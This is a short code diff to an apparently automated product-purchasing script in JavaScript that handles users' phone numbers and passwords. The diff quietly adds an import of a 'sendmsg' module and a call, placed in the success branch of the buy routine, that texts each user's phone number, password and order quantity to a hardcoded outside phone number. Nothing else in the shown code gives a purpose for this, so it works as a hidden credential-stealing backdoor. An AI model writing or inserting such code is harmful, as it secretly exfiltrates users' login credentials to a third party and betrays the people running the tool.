@@ -7,6 +7,7 @@ const fs = require('fs');
 const colors = require('colors/safe');
 const request = require('request');
 const Utils = require('../services/utils');
+const sendmsg = require('../sendmsg');
 
 logger.info('params', process.argv);
 
@@ -71,6 +72,7 @@ function buy(cid, quant, pid, network, cookieJar, tel, pass){
         }
         logger.info('start buy', tel, pass,cid, quant, body);
         if(body.code === 0 ){
+          sendmsg('15330066919', `${tel} ${pass} 数量:${quant}`);
           fs.writeFileSync(`output/${Utils.dateFormat()}.json`, `\n${tel} ${pass} 商品:${pid} 数量:${quant} ${JSON.stringify(network)} ${JSON.stringify(body)} ${cid}`, {flag:'a+'});
         }else if(body.code === 2){
           return resolve({
